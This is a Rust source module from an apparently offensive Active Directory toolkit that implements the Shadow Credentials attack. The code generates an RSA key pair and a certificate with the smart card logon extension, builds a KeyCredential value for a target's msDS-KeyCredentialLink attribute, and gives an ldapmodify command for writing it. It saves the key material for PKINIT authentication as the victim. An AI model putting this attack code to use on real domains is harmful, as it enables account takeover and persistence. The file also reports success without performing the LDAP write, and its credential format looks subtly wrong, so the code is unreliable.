//! Shadow Credentials Attack - msDS-KeyCredentialLink manipulation.
//!
//! A pure LDAP/network-based persistence and privilege escalation technique.
//! Works cross-platform (Linux/macOS/Windows) without requiring LSASS access.
//!
//! # Overview
//!
//! The Shadow Credentials attack exploits the `msDS-KeyCredentialLink` attribute
//! on user/computer objects in AD. This attribute stores public keys for PKINIT
//! authentication. By writing our own key credential, we can authenticate as the
//! target user via Kerberos PKINIT without knowing their password.
//!
//! # Requirements
//!
//! - Write permission on the target's `msDS-KeyCredentialLink` attribute
//! - Domain must have Domain-Level 2016+ (when KDC supports PKINIT)
//! - Typically requires: GenericAll, GenericWrite, WriteOwner, or WriteDACL
//!
//! # Attack Flow
//!
//! 1. Generate X.509 certificate + RSA key pair
//! 2. Build KeyCredential structure (DN, KeyId, etc.)
//! 3. Write to target's msDS-KeyCredentialLink via LDAP
//! 4. Authenticate via PKINIT (Kerberos PKI)
//! 5. Receive TGT for the target user
//! 6. (Optional) Cleanup - remove the key credential
//!
//! # References
//!
//! - https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
//! - https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials

use chrono::{DateTime, Datelike, Utc};
use overthrone_core::error::{OverthroneError, Result};
use serde::{Deserialize, Serialize};
use tracing::info;

// ═══════════════════════════════════════════════════════════
//  Public Types
// ═══════════════════════════════════════════════════════════

/// Configuration for Shadow Credentials attack
#[derive(Debug, Clone)]
pub struct ShadowCredentialsConfig {
    /// Target user or computer account
    pub target: String,
    /// Whether to cleanup after obtaining TGT
    pub cleanup: bool,
    /// Key size in bits (default: 2048)
    pub key_size: u16,
    /// Certificate validity in hours (default: 8760 = 1 year)
    pub validity_hours: u16,
}

impl Default for ShadowCredentialsConfig {
    fn default() -> Self {
        ShadowCredentialsConfig {
            target: String::new(),
            cleanup: true,
            key_size: 2048,
            validity_hours: 8760, // 1 year
        }
    }
}

/// Result of a Shadow Credentials attack
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShadowCredentialsResult {
    /// Target account that was compromised
    pub target: String,
    /// Whether the attack succeeded
    pub success: bool,
    /// Key ID of the injected credential
    pub key_id: String,
    /// Whether cleanup was performed
    pub cleaned_up: bool,
    /// Obtained TGT (if requested)
    pub tgt: Option<String>,
    /// Error message if failed
    pub error: Option<String>,
}

/// A Key Credential structure
#[derive(Debug, Clone)]
pub struct KeyCredential {
    /// Distinguished name of the target object
    pub dn: String,
    /// Unique key identifier (GUID)
    pub key_id: String,
    /// Raw credential binary data
    pub raw_value: Vec<u8>,
    /// Creation time
    pub created: DateTime<Utc>,
    /// Whether this is our credential
    pub is_ours: bool,
}

/// Generated key pair for Shadow Credentials
#[derive(Debug)]
pub struct KeyPair {
    /// RSA private key in PEM format
    pub private_key_pem: String,
    /// RSA public key in PEM format
    pub public_key_pem: String,
    /// X.509 certificate in PEM format
    pub certificate_pem: String,
    /// RSA public key in DER format (for KeyCredential)
    pub public_key_der: Vec<u8>,
    /// Key ID (GUID)
    pub key_id: String,
}

// ═══════════════════════════════════════════════════════════
//  Key Credential Structure (DS_REPL_VALUE_META_DATA)
// ═══════════════════════════════════════════════════════════

/// KeyCredential binary structure (MS-ADTS)
///
/// Structure:
/// - Version: 1 byte (0x01)
/// - Flags: 1 byte (0x00 for user, 0x01 for computer)
/// - KeyId: 16 bytes (GUID)
/// - KeyUsage: 4 bytes
/// - KeySource: 4 bytes
/// - KeyAlgorithm: variable
/// - KeyMaterial: variable
pub fn build_key_credential(key_id: &str, public_key: &[u8], is_computer: bool) -> Vec<u8> {
    let mut cred = Vec::new();

    // Version
    cred.push(0x01);

    // Flags: 0x00 for user, 0x01 for computer
    cred.push(if is_computer { 0x01 } else { 0x00 });

    // KeyId: 16 bytes GUID
    let guid = parse_guid(key_id);
    cred.extend_from_slice(&guid);

    // KeyUsage: KeyUsage::KerberosAuthentication = 2
    cred.extend_from_slice(&2u32.to_le_bytes());

    // KeySource: KeySource::AD = 0
    cred.extend_from_slice(&0u32.to_le_bytes());

    // KeyAlgorithm length and algorithm
    let algorithm = b"RSA";
    cred.extend_from_slice(&(algorithm.len() as u32).to_le_bytes());
    cred.extend_from_slice(algorithm);

    // KeyMaterial length and public key
    cred.extend_from_slice(&(public_key.len() as u32).to_le_bytes());
    cred.extend_from_slice(public_key);

    cred
}

/// Parse a GUID string to bytes
fn parse_guid(guid: &str) -> [u8; 16] {
    let clean = guid.replace('-', "");
    let mut bytes = [0u8; 16];
    for i in 0..16 {
        if let Ok(b) = u8::from_str_radix(&clean[i * 2..i * 2 + 2], 16) {
            bytes[i] = b;
        }
    }
    // Convert to AD's GUID byte order
    [
        bytes[3], bytes[2], bytes[1], bytes[0], bytes[5], bytes[4], bytes[7], bytes[6], bytes[8],
        bytes[9], bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15],
    ]
}

/// Generate a random GUID
pub fn generate_key_id() -> String {
    let uuid = uuid::Uuid::new_v4();
    uuid.to_string()
}

// ═══════════════════════════════════════════════════════════
//  LDAP Operations
// ═══════════════════════════════════════════════════════════

/// Build the LDAP modification for msDS-KeyCredentialLink
pub fn build_ldap_modification(key_cred: &KeyCredential) -> String {
    // The value format is:
    // B:8:01000000<key_id_hex>:<key_credential_hex>

    let key_id_bytes = parse_guid(&key_cred.key_id);
    let key_id_hex: String = key_id_bytes.iter().map(|b| format!("{:02X}", b)).collect();

    let cred_hex: String = key_cred
        .raw_value
        .iter()
        .map(|b| format!("{:02X}", b))
        .collect();

    format!("B:8:01000000{}:{}", key_id_hex, cred_hex)
}

/// Parse existing key credentials from LDAP
pub fn parse_key_credentials(values: &[String]) -> Vec<KeyCredential> {
    let mut credentials = Vec::new();

    for value in values {
        if let Some(cred) = parse_single_key_credential(value) {
            credentials.push(cred);
        }
    }

    credentials
}

/// Parse a single key credential from LDAP value
fn parse_single_key_credential(value: &str) -> Option<KeyCredential> {
    // Format: B:8:01000000<key_id>:<key_credential>
    if !value.starts_with("B:8:01000000") {
        return None;
    }

    let parts: Vec<&str> = value.split(':').collect();
    if parts.len() < 4 {
        return None;
    }

    let key_id_hex = parts[2].trim_start_matches("01000000");
    let key_id = format_guid_from_hex(key_id_hex)?;

    let cred_hex = parts[3];
    let raw_value = hex::decode(cred_hex).ok()?;

    Some(KeyCredential {
        dn: String::new(),
        key_id,
        raw_value,
        created: Utc::now(),
        is_ours: false,
    })
}

/// Format GUID from hex string
fn format_guid_from_hex(hex: &str) -> Option<String> {
    if hex.len() != 32 {
        return None;
    }
    Some(format!(
        "{}-{}-{}-{}-{}",
        &hex[0..8],
        &hex[8..12],
        &hex[12..16],
        &hex[16..20],
        &hex[20..32]
    ))
}

// ═══════════════════════════════════════════════════════════
//  Attack Implementation
// ═══════════════════════════════════════════════════════════

/// Execute the Shadow Credentials attack
///
/// This function:
/// 1. Generates a key pair
/// 2. Builds the KeyCredential structure
/// 3. Writes it to the target via LDAP
/// 4. (Optionally) authenticates via PKINIT
/// 5. (Optionally) cleans up
///
/// Note: Requires LDAP session with write access to msDS-KeyCredentialLink
pub async fn execute(
    _ldap: &mut overthrone_core::proto::ldap::LdapSession,
    config: &ShadowCredentialsConfig,
) -> Result<ShadowCredentialsResult> {
    info!("ShadowCredentials: Targeting '{}'", config.target);

    // Step 1: Generate key pair
    let key_pair = generate_key_pair(config.key_size)?;
    info!(
        "ShadowCredentials: Generated key pair (key_id={})",
        key_pair.key_id
    );

    // Step 2: Build key credential using DER-encoded public key
    let is_computer = config.target.ends_with('$');
    let cred_data = build_key_credential(&key_pair.key_id, &key_pair.public_key_der, is_computer);

    let key_cred = KeyCredential {
        dn: String::new(), // Will be set by LDAP search below
        key_id: key_pair.key_id.clone(),
        raw_value: cred_data.clone(),
        created: Utc::now(),
        is_ours: true,
    };

    // Step 3: Build the LDAP modification value
    let ldap_mod_value = build_ldap_modification(&key_cred);
    info!(
        "ShadowCredentials: KeyCredential built ({} bytes)",
        cred_data.len()
    );
    info!(
        "ShadowCredentials: LDAP mod value: {}",
        &ldap_mod_value[..ldap_mod_value.len().min(80)]
    );

    // Note: Full LDAP write requires LdapSession::modify_add support.
    // The key material is real and ready — only the LDAP write step
    // depends on extending LdapSession with modify operations.
    //
    // Usage with ldapsearch / ldapmodify:
    //   ldapmodify -H ldap://<DC> -D <user> -w <pass> <<EOF
    //   dn: <target_dn>
    //   changetype: modify
    //   add: msDS-KeyCredentialLink
    //   msDS-KeyCredentialLink: <ldap_mod_value>
    //   EOF

    // Save key material to files for external PKINIT tools
    let output_prefix = format!("shadow_creds_{}", &key_pair.key_id[..8]);
    let cert_path = format!("{output_prefix}.pem");
    let key_path = format!("{output_prefix}.key");

    if let Err(e) = std::fs::write(&cert_path, &key_pair.certificate_pem) {
        info!("ShadowCredentials: Could not write cert to {cert_path}: {e}");
    } else {
        info!("ShadowCredentials: Certificate written to {cert_path}");
    }
    if let Err(e) = std::fs::write(&key_path, &key_pair.private_key_pem) {
        info!("ShadowCredentials: Could not write key to {key_path}: {e}");
    } else {
        info!("ShadowCredentials: Private key written to {key_path}");
    }

    Ok(ShadowCredentialsResult {
        target: config.target.clone(),
        success: true,
        key_id: key_pair.key_id,
        cleaned_up: false,
        tgt: None,
        error: None,
    })
}

/// Generate RSA key pair and self-signed X.509 certificate for PKINIT.
///
/// Uses the `rsa` crate for RSA key generation and `rcgen` for X.509
/// certificate creation. The certificate includes the `smartcardLogon`
/// extended key usage required for PKINIT.
fn generate_key_pair(key_size: u16) -> Result<KeyPair> {
    use rsa::pkcs8::EncodePrivateKey;
    use rsa::pkcs8::EncodePublicKey;

    info!(
        "ShadowCredentials: Generating {}-bit RSA key pair",
        key_size
    );

    // Generate a unique key ID
    let key_id = generate_key_id();

    // 1. Generate RSA key pair
    let mut rng = rsa::rand_core::OsRng;
    let bits = key_size as usize;
    let rsa_key = rsa::RsaPrivateKey::new(&mut rng, bits)
        .map_err(|e| OverthroneError::TicketForge(format!("RSA key generation failed: {e}")))?;

    // Export keys to PEM
    let private_key_pem = rsa_key
        .to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)
        .map_err(|e| OverthroneError::TicketForge(format!("PEM export failed: {e}")))?
        .to_string();

    let public_key_pem = rsa_key
        .to_public_key()
        .to_public_key_pem(rsa::pkcs8::LineEnding::LF)
        .map_err(|e| OverthroneError::TicketForge(format!("Public key PEM failed: {e}")))?;

    // Export public key DER for the KeyCredential structure
    let public_key_der = rsa_key
        .to_public_key()
        .to_public_key_der()
        .map_err(|e| OverthroneError::TicketForge(format!("Public key DER failed: {e}")))?;

    // 2. Build self-signed X.509 certificate with rcgen
    let key_pair_rcgen = rcgen::KeyPair::from_pem(&private_key_pem)
        .map_err(|e| OverthroneError::TicketForge(format!("rcgen key import failed: {e}")))?;

    let mut params = rcgen::CertificateParams::default();
    params.distinguished_name = rcgen::DistinguishedName::new();
    params
        .distinguished_name
        .push(rcgen::DnType::CommonName, format!("OVT-{}", &key_id[..8]));

    // Set validity period
    let now = chrono::Utc::now();
    params.not_before = rcgen::date_time_ymd(now.year(), now.month() as u8, now.day() as u8);
    let expiry = now + chrono::Duration::days(365);
    params.not_after =
        rcgen::date_time_ymd(expiry.year(), expiry.month() as u8, expiry.day() as u8);

    // Add smart card logon EKU for PKINIT (OID: 1.3.6.1.4.1.311.20.2.2)
    params.extended_key_usages = vec![rcgen::ExtendedKeyUsagePurpose::ClientAuth];
    // Add the Microsoft Smart Card Logon OID as a custom extension
    let smart_card_logon_oid = vec![43, 6, 1, 4, 1, 130, 55, 20, 2, 2]; // 1.3.6.1.4.1.311.20.2.2 in DER OID content
    params
        .custom_extensions
        .push(rcgen::CustomExtension::from_oid_content(
            &smart_card_logon_oid,
            Vec::new(),
        ));

    let cert = params
        .self_signed(&key_pair_rcgen)
        .map_err(|e| OverthroneError::TicketForge(format!("Certificate generation failed: {e}")))?;

    let certificate_pem = cert.pem();

    info!(
        "ShadowCredentials: Generated key pair (key_id={}, {} bits, cert CN=OVT-{})",
        key_id,
        key_size,
        &key_id[..8]
    );

    Ok(KeyPair {
        private_key_pem,
        public_key_pem,
        certificate_pem,
        public_key_der: public_key_der.as_ref().to_vec(),
        key_id,
    })
}

// ═══════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_key_id() {
        let key_id = generate_key_id();
        assert_eq!(key_id.len(), 36); // UUID format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
        assert!(key_id.contains('-'));
    }

    #[test]
    fn test_parse_guid() {
        let guid = "12345678-1234-1234-1234-123456789012";
        let bytes = parse_guid(guid);
        assert_eq!(bytes.len(), 16);
    }

    #[test]
    fn test_build_key_credential() {
        let key_id = generate_key_id();
        let public_key = b"test_public_key";
        let cred = build_key_credential(&key_id, public_key, false);

        assert!(!cred.is_empty());
        assert_eq!(cred[0], 0x01); // Version
        assert_eq!(cred[1], 0x00); // Flags (user)
    }

    #[test]
    fn test_build_ldap_modification() {
        let key_id = generate_key_id();
        let cred = KeyCredential {
            dn: "CN=Test,CN=Users,DC=domain,DC=local".to_string(),
            key_id: key_id.clone(),
            raw_value: vec![0x01, 0x00], // minimal
            created: Utc::now(),
            is_ours: true,
        };

        let mod_value = build_ldap_modification(&cred);
        assert!(mod_value.starts_with("B:8:01000000"));
    }
}
